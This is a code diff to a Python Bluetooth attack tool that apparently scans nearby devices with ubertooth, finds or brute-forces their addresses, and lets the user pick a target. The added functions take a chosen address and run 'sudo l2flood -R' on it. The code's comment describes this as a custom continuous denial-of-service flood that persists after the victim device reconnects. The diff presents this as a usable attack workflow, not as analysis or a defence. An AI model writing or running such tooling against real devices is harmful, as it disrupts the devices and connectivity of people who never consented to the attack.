@@ -102,19 +102,117 @@ def parse_survey_results(output):
     return needs_bruteforce, ready_to_use
 
 
+def _prompt_ready_or_bruteforce():
+    """Both pools are non-empty -- ask which one the user wants to act on:
+    an address that's already complete ('ready to use', no brute-force
+    needed), or a LAP that still needs its UAP brute-forced."""
+    while True:
+        choice = input(
+            "\nUse a ready-to-use address, or brute-force a candidate? "
+            "[ready/brute]: "
+        ).strip().lower()
+        if choice in ("r", "ready"):
+            return "ready"
+        if choice in ("b", "brute", "bruteforce"):
+            return "bruteforce"
+        print("Please enter 'ready' or 'brute'.")
+
+
+def _select_ready_address(ready_to_use, prefix):
+    """Let the user pick one of the ready-to-use (known-UAP) addresses.
+    Returns the full address string, or None if skipped."""
+    if len(ready_to_use) == 1:
+        uap, lap = ready_to_use[0]
+        return f"{prefix}:{uap}:{lap}"
+
+    while True:
+        choice = input(
+            f"\nSelect a ready-to-use address number (1-{len(ready_to_use)}), "
+            "or press Enter to skip: "
+        ).strip()
+        if not choice:
+            return None
+        if choice.isdigit() and 1 <= int(choice) <= len(ready_to_use):
+            uap, lap = ready_to_use[int(choice) - 1]
+            return f"{prefix}:{uap}:{lap}"
+        print("Invalid selection.")
+
+
+def confirm_and_run(addr):
+    """Show the command for `addr` and its comment, and run it only
+    after explicit user confirmation. Output is swallowed -- only the
+    "Command is running..." status line is shown, not raw stdout/stderr.
+
+    Returns True if the command was confirmed and attempted, False if
+    the user declined.
+    """
+    command = ["sudo", "l2flood", "-R", addr]
+    comment = "# A cstume l2flood with new flag -R for continuous flood even after reconnection of the DOS'ed device"
+    name = command[1] if command[0] == "sudo" else command[0]
+    print(f"\nCommand to run: {' '.join(command)}  {comment}")
+
+    choice = input(f"Proceed with {name}? [y/N]: ").strip().lower()
+    if choice not in ("y", "yes"):
+        print("Skipped.")
+        return False
+
+    print(f"{name} is running...")
+    try:
+        subprocess.run(
+            command, check=False,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+    except FileNotFoundError:
+        print(f"'{command[0]}' not found on PATH.")
+    return True
+
+
 def select_target(needs_bruteforce, ready_to_use, prefix):
-    """Show survey results and let the user pick a sweep target.
-    Returns the chosen LAP string, or None if the user skipped."""
+    """Show survey results and let the user pick what to do next.
+
+    If both pools are non-empty, first asks whether to act on a
+    ready-to-use (known-UAP) address or brute-force a candidate LAP. If
+    only one pool is non-empty, that choice is skipped.
+
+    Returns a (mode, value) tuple:
+      ("sweep", lap) -- user picked a brute-force candidate; `lap` is
+                        ready to hand to the sweep as known_octets.
+      ("ready", None) -- user picked a ready-to-use address; its command
+                          was shown and either run or declined -- nothing
+                          further for the caller to do with this survey
+                          pass.
+      (None, None)    -- user skipped / nothing available.
+    """
     if ready_to_use:
         print("\nReady to use (UAP already resolved -- no brute-force needed):")
-        for uap, lap in ready_to_use:
-            print(f"  [ready] {prefix}:{uap}:{lap}  "
+        for i, (uap, lap) in enumerate(ready_to_use, 1):
+            print(f"  {i}) {prefix}:{uap}:{lap}  "
                   f"(NAP assumed from --prefix; UAP+LAP confirmed by ubertooth)")
-        print(f"  -> test one directly with: bbf {ready_to_use[0][1]} --only {ready_to_use[0][0]}")
+
+    if not ready_to_use and not needs_bruteforce:
+        print("\nNo devices detected.")
+        return (None, None)
+
+    if ready_to_use and needs_bruteforce:
+        mode = _prompt_ready_or_bruteforce()
+    elif ready_to_use:
+        mode = "ready"
+    else:
+        mode = "bruteforce"
+
+    if mode == "ready":
+        addr = _select_ready_address(ready_to_use, prefix)
+        if addr is None:
+            return (None, None)
+        # Address already has a discovered UAP -- nothing left to
+        # brute-force, so run the command against it directly (with its
+        # own confirmation prompt) instead of touching the sweep.
+        confirm_and_run(addr)
+        return ("ready", None)
 
     if not needs_bruteforce:
-        print("\nNothing left to brute-force." if ready_to_use else "\nNo devices detected.")
-        return None
+        print("\nNothing left to brute-force.")
+        return (None, None)
 
     print("\nCandidates needing UAP brute-force:")
     for i, lap in enumerate(needs_bruteforce, 1):
@@ -123,7 +221,7 @@ def select_target(needs_bruteforce, ready_to_use, prefix):
     while True:
         choice = input("\nSelect a target number, or press Enter to skip: ").strip()
         if not choice:
-            return None
+            return (None, None)
         if choice.isdigit() and 1 <= int(choice) <= len(needs_bruteforce):
-            return needs_bruteforce[int(choice) - 1]
+            return ("sweep", needs_bruteforce[int(choice) - 1])
         print("Invalid selection.")
